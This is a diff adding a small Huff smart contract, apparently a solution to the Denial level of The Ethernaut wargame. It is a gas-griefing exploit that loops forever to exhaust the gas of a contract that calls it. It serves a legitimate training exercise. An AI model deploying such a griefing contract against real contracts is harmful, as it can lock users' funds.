@@ -1,0 +1,10 @@
+/// @title A hack for level 20 (Denial) of The Ethernaut
+/// @notice SPDX-License-Identifier: MIT
+/// @author unluckyduke7
+
+#define macro MAIN() = takes (0) returns (0) {
+	gas 0x2 add 0xf4240 gt infinite jumpi stop
+
+	infinite:
+		infinite jump
+}
